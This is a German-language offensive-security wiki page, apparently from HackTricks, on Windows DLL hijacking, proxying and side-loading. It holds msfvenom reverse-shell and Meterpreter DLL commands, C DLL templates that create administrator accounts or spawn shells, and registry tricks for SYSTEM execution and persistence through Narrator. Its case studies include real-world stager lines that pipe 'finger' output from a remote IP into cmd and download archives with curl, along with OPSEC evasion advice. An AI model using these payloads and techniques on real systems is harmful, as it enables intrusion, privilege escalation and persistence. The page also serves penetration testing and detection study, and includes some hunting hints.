Ein **DLL-Proxy** ist im Wesentlichen eine DLL, die **deinen bösartigen Code ausführen kann, wenn sie geladen wird**, aber auch die Funktionen der echten Bibliothek **bereitstellt** und wie **erwartet funktioniert**, indem sie alle Aufrufe an die echte Bibliothek weiterleitet.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du eine ausführbare Datei angeben und die Bibliothek auswählen, die du proxifizieren möchtest, um eine **proxifizierte DLL zu generieren**. Alternativ kannst du eine **DLL angeben** und eine **proxifizierte DLL generieren**.

### **Meterpreter**

**Rev Shell abrufen (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter erhalten (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Eigene DLL

In vielen Fällen muss die von dir kompilierte DLL **jede Funktion exportieren, die vom Opferprozess importiert wird**. Fehlt ein erforderlicher Export, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++-DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization-DLL, die für beliebige Codeausführung und Persistenz gehijackt werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Prüfpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exports sind nicht erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und beobachten, wie der oben genannte Pfad geladen werden soll.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC: unauffällig bleiben
- Ein naiver Hijack gibt Sprachausgabe aus oder hebt die UI hervor. Um unauffällig zu bleiben, enumeriere beim Attach die Narrator-Threads, öffne den Hauptthread (`OpenThread(THREAD_SUSPEND_RESUME)`) und suspendiere ihn mit `SuspendThread`; führe die Ausführung in deinem eigenen Thread fort. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Auslösen und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt der Start von Narrator die platzierte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Stelle eine RDP-Verbindung zum Host her und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, sobald die RDP-Sitzung geschlossen wird – injiziere/migriere umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen integrierten Accessibility Tool (AT)-Registry-Eintrag (z. B. CursorIndicator) klonen, so bearbeiten, dass er auf eine beliebige Binärdatei/DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird die Ausführung beliebigen Codes über das Accessibility-Framework vermittelt.

Hinweise
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordern Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` enthalten sein; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation mithilfe von TPQMAssistant.exe

Dieser Fall zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details zur Sicherheitslücke

- **Komponente**: `TPQMAssistant.exe` unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, sodass lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, wenn die Datei fehlt. Das weist auf eine bevorzugte Suche im lokalen Verzeichnis hin.

### Exploit-Implementierung

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis ablegen und die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei Ausführung der Aufgabe ein Administrator angemeldet ist, wird die schädliche DLL in der Sitzung des Administrators mit mittlerer Integritätsstufe ausgeführt.
4. Verknüpfe gängige UAC-Bypass-Techniken, um von mittlerer Integritätsstufe zu SYSTEM-Rechten zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading über einen signierten Host (wsc_proxy.exe)

Threat Actors kombinieren häufig MSI-basierte Dropper mit DLL Side-Loading, um Payloads in einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Übersicht der Angriffskette
- Der Benutzer lädt eine MSI-Datei herunter. Während der GUI-Installation wird unbemerkt eine CustomAction ausgeführt (z. B. LaunchApplication oder eine VBScript-Aktion), die die nächste Stufe aus eingebetteten Ressourcen rekonstruiert.
- Der Dropper schreibt eine legitime, signierte EXE-Datei und eine schädliche DLL in dasselbe Verzeichnis (Beispiel: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows-DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so Angreifercode unter einem signierten übergeordneten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- Tabelle CustomAction:
  - Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
  - Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/aufgeteilte Payloads im MSI-CAB:
  - Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder lessmsi verwenden: lessmsi x package.msi C:\out
  - Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction zusammengefügt und entschlüsselt werden. Häufiger Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: Angreifer-DLL. Wenn keine bestimmten Exports erforderlich sind, reicht DllMain aus; andernfalls erstelle eine Proxy-DLL und leite erforderliche Exports an die echte Bibliothek weiter, während du den Payload in DllMain ausführst.
- Erstelle einen minimalen DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Exportanforderungen solltest du ein Proxying-Framework (z. B. DLLirant/Spartacus) verwenden, um eine Forwarding-DLL zu erzeugen, die zugleich deine Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Ladeflags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und weitergeleitete Exporte können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** einsetzt, um sich in legitimer Software zu tarnen und zugleich die Kern-Payload auf der Festplatte verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Hersteller wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei so um, dass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird mit einem erwarteten Namen neben der EXE abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist meist eine mit dem ScatterBrain-Framework obfuskierte MFC-Binärdatei. Ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad per Reflective Mapping zu laden.
3. **Verschlüsselter Payload-Blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload in den Speicher gemappt wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu beseitigen.

Tradecraft-Hinweise:

* Durch das Umbenennen der signierten EXE (bei gleichzeitiger Beibehaltung des ursprünglichen `OriginalFileName` im PE-Header) kann sie sich als Windows-Binärdatei tarnen und zugleich die Herstellersignatur behalten. Übernimm daher Ink Dragons Vorgehen und lege `conhost.exe`-ähnliche Binärdateien ab, bei denen es sich tatsächlich um AMD-/NVIDIA-Dienstprogramme handelt.
* Da die ausführbare Datei weiterhin als vertrauenswürdig gilt, muss bei den meisten Allowlisting-Kontrollen nur deine bösartige DLL daneben liegen. Konzentriere dich auf die Anpassung der Loader-DLL; der signierte übergeordnete Prozess kann in der Regel unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass sich der TMP-Blob neben dem Loader befindet und beschreibbar ist, damit er die Datei nach dem Mapping mit Nullen überschreiben kann. Lass das Verzeichnis beschreibbar, bis die Payload geladen ist. Sobald sie sich im Speicher befindet, kann die TMP-Datei für OPSEC gefahrlos gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die bösartige DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote-Befehls-Loader (Finger):** Ein verborgenes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus und ermöglicht es den Operatoren, den Second-Stage-Server serverseitig auszutauschen.

- **Integriertes Herunterladen/Entpacken:** Lade ein Archiv mit einer harmlosen Dateiendung herunter, entpacke es und platziere das Sideload-Ziel samt DLL in einem zufälligen `%LocalAppData%`-Ordner:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das in Windows integrierte tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, damit die Telemetrie einen von CIM erstellten Prozess anzeigt, während dieser die DLL aus demselben Verzeichnis lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); die Payload (z. B. Remcos) läuft unter einem vertrauenswürdigen Namen.

- **Hunting:** Erstelle einen Alert für `forfiles`, wenn `/p`, `/m` und `/c` gemeinsam vorkommen; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-dropper + Bitdefender Submission Wizard-Sideload (Chrysalis)

Bei einem kürzlich erfolgten Eindringen von Lotus Blossom wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS gepackten Dropper auszuliefern, der einen DLL-Sideload sowie vollständig im Arbeitsspeicher ausgeführte Payloads bereitstellte.<sup>[[13]](#references)</sup>

Ablauf des Tradecrafts
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard-Datei `BluetoothService.exe`, eine bösartige `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten, LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Klartext-Shellcode, gibt temporäre Daten frei und springt dorthin.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** hasht, anschließend einen Murmur-artigen Avalanche-Schritt (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem es den Schlüssel `gQ2JR&9;` in fünf Durchläufen wiederholt für Add/XOR/Sub verwendet, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Auflösung der Imports abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mithilfe zeichenweiser Bit-Rotate/XOR-Transformationen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt; dadurch werden die C2-URL und der User-Agent sichtbar.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend mit dem Schlüssel `vAuig34%^325hGV` per RC4, bevor sie es über HTTPS an `HttpSendRequestA` übergeben. Antworten werden per RC4 entschlüsselt und anhand eines Tag-Switches verarbeitet (`4T` shell, `4V` Prozessausführung, `4W/4X` Dateischreiben, `4Y` Lesen/Exfiltration, `4\\` Deinstallation, `4` Laufwerks-/Dateiaufzählung + Fälle für blockweise Übertragung).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistence installieren (Service/Run key), der auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt die Payload aus.

Beobachteter alternativer Loader
- Bei demselben Eindringen wurden Tiny C Compiler heruntergeladen und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Arbeitsspeicher ausgeführt, ohne ein PE auf die Festplatte zu schreiben. Reproduziere dies mit:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud einen Shellcode der zweiten Stufe von einer fest codierten URL herunter. So entstand ein flexibler Loader, der sich als Compilerlauf tarnt.

## Signed-Host-Sideloading mit Export-Proxying + Host-Thread-Parking

Einige DLL-Sideloading-Ketten nutzen **Stabilitätsmaßnahmen**, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der schädlichen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer schädlichen DLL ablegen, die den erwarteten Abhängigkeitsnamen trägt, etwa `version.dll`.
- Die schädliche DLL **proxyt jeden erwarteten Export** an die echte System-DLL weiter (zum Beispiel `%SystemRoot%\\System32\\version.dll`), damit die Importauflösung weiterhin funktioniert und der Host-Prozess aktiv bleibt.
- Nach dem Laden patcht die schädliche DLL den Entry Point des Hosts, sodass der Hauptthread in einer Endlosschleife mit `Sleep` landet, statt Codepfade auszuführen, die den Prozess beenden würden.
- Ein neuer Thread führt die eigentliche schädliche Arbeit aus: Er entschlüsselt den Namen oder Pfad der DLL der nächsten Stufe (RC4/XOR sind gängig) und lädt sie anschließend mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug für spätere Stufen aktiv bleibt.
- Den Hauptthread mit `Sleep(INFINITE)` zu parken, ist eine einfache Möglichkeit, den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder Netzwerk-Bootstrap ausführt.
- Wer nur nach einer verdächtigen `DllMain` sucht, übersieht dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host-Entry-Points und dem Start eines sekundären Threads auftritt.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Entry-Point oder die Start-Routine des Hauptthreads patchen, sodass eine Schleife mit `Sleep` ausgeführt wird.
5. Den Namen/die Konfiguration der DLL der nächsten Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell mappen.

Ansatzpunkte für die Verteidigung
- Signierte Prozesse, die `version.dll` oder ähnlich gängige Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Prozess-Entry-Point kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erstellt werden und sofort `LoadLibrary` für eine zweite DLL mit entschlüsseltem Namen aufrufen.
- Proxy-DLLs mit vollständigem Exportumfang, die neben Hersteller-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden liegen.

## References

- [1] [Red Canary – Intelligence-Einblicke: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Privilegienausweitung mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows. Einfaches C-Beispiel.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich weiterentwickelnder Identitätskampagnen zur Verbreitung von Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zusammenlaufende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein tiefer Einblick in das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Screen Serpens, einer iranischen APT, im Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast und Furios: Nimbus-Manticore-Operationen während des iranischen Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
